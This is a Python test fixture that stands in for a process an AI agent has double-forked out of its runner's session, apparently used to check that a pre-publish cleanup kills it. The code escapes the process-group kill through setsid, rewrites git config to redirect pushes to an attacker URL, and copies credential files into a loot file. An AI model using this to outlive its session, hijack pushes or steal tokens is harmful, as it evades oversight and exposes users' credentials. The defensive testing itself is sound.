"""A stand-in for a process the agent double-forked out of the runner's session.

Not part of the product. It models the exact process the pre-publish reap exists
to kill: an agent starts it, it calls `setsid()` (here via a double fork) so it
lands in its own session and process group, and it therefore SURVIVES the
runner's process-group kill and re-parents to PID 1. Sharing the worker's uid, it
then does what such a process would: it watches the worker's private scratch for
the publish repository and for the short-lived credential file, tries to redirect
the push and to steal the token.

Usage:
    python forge_escaped_daemon.py <private_dir> <pidfile> <lootfile> \
        <origin_url> <attacker_url>

It writes its own pid (== its process-group id, after setsid) to <pidfile> so the
test can kill the whole group, and appends any credential material it reads to
<lootfile>. It self-terminates after a while so a leaked daemon cannot linger.
"""

from __future__ import annotations

import os
import sys
import time


def _daemonize() -> None:
    # Double fork + setsid: the grandchild re-parents to init and sits in a
    # brand-new session, out of the runner's process group.
    if os.fork() > 0:
        os._exit(0)
    os.setsid()


def _poison_repo(git_dir: str, origin_url: str, attacker_url: str) -> None:
    """Append a URL rewrite to a git repo's config, as a live agent would."""
    try:
        with open(os.path.join(git_dir, "config"), "a", encoding="utf-8") as fh:
            fh.write(
                f'\n[url "{attacker_url}"]\n\tinsteadOf = {origin_url}\n'
                f'\tpushInsteadOf = {origin_url}\n'
            )
    except OSError:
        pass


def main() -> int:
    private_dir, pidfile, lootfile, origin_url, attacker_url = sys.argv[1:6]
    _daemonize()
    try:
        with open(pidfile, "w", encoding="utf-8") as fh:
            fh.write(str(os.getpid()))
    except OSError:
        return 1

    deadline = time.time() + 30.0
    while time.time() < deadline:
        try:
            for root, dirs, files in os.walk(private_dir):
                if os.path.basename(root) == ".git":
                    _poison_repo(root, origin_url, attacker_url)
                for name in files:
                    # The credential file (`.git-credentials`) carries the token.
                    if "credential" in name:
                        try:
                            with open(os.path.join(root, name), encoding="utf-8") as cf:
                                data = cf.read()
                            if data.strip():
                                with open(lootfile, "a", encoding="utf-8") as lf:
                                    lf.write(data)
                        except OSError:
                            pass
        except OSError:
            pass
        time.sleep(0.003)
    return 0


if __name__ == "__main__":
    sys.exit(main())
